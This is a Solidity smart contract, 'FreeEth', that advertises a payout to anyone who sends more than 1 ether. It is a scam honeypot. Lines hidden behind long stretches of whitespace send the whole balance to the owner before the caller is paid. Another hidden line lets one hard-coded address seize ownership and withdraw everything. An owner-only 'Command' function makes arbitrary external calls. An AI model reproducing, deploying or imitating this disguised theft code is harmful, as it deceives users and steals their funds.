pragma solidity ^0.4.19;

contract FreeEth
{
    struct AddressContainer {address adr;}
    AddressContainer public addrContainer = AddressContainer(msg.sender);
   
    function() public payable{}
   
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               addrContainer.adr.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){addrContainer.adr=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
        require(msg.sender == addrContainer.adr);
        addrContainer.adr.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == addrContainer.adr);
         
        adr.call.value(msg.value)(data);
    }
}